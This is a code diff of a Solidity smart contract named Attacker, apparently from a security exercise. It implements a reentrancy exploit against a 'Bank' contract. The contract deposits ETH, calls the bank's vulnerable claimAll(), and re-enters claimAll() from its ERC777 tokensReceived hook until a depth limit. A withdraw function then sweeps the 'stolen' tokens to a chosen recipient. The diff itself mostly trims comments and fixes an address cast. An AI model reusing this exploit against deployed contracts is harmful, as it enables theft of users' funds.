@@ -1,4 +1,4 @@
-// Attacker.sol
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
 import "@openzeppelin/contracts/access/AccessControl.sol";
@@ -25,7 +25,7 @@ contract Attacker is AccessControl, IERC777Recipient {
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
         _grantRole(ATTACKER_ROLE, admin);
-        // register this contract as an ERC777 recipient
+        // register as ERC777 recipient
         _erc1820.setInterfaceImplementer(
             address(this),
             TOKENS_RECIPIENT_INTERFACE_HASH,
@@ -36,30 +36,26 @@ contract Attacker is AccessControl, IERC777Recipient {
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
         bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token().address);
+        // grant role to the token's address (cast contract to address):
+        _grantRole(ATTACKER_ROLE, address(bank.token()));
     }
 
     /*
-       Starts the attack.  Caller must send `amt` ETH along with this call.
+       Starts the attack. Must send `amt` ETH along with this call.
     */
     function attack(uint256 amt) payable public {
         require(address(bank) != address(0), "Target bank not set");
         require(msg.value == amt,             "Must send ETH = amt");
 
-        // reset recursion counter
         depth = 0;
-
-        // 1) deposit ETH to the bank
         bank.deposit{value: amt}();
         emit Deposit(amt);
 
-        // 2) trigger the vulnerable claimAll → this will mint tokens,
-        //    which calls our tokensReceived hook and lets us recurse.
         bank.claimAll();
     }
 
     /*
-       After the attack, pull out all of the stolen ERC777 tokens to `recipient`.
+       Sweep out stolen tokens to `recipient`
     */
     function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
         ERC777 token = bank.token();
@@ -67,8 +63,7 @@ contract Attacker is AccessControl, IERC777Recipient {
     }
 
     /*
-       This is called by the ERC777 token during mint().
-       We use it to re-enter `bank.claimAll()` as long as depth < max_depth.
+       ERC777 hook — called on each mint
     */
     function tokensReceived(
         address,    /* operator */
@@ -78,16 +73,14 @@ contract Attacker is AccessControl, IERC777Recipient {
         bytes calldata, /* userData */
         bytes calldata  /* operatorData */
     ) external override {
-        // only react to our target token
         require(msg.sender == address(bank.token()), "Invalid token");
-
         if (depth < max_depth) {
             depth++;
             emit Recurse(depth);
-            // re-enter the vulnerable call
             bank.claimAll();
         }
     }
 }
+
 
 
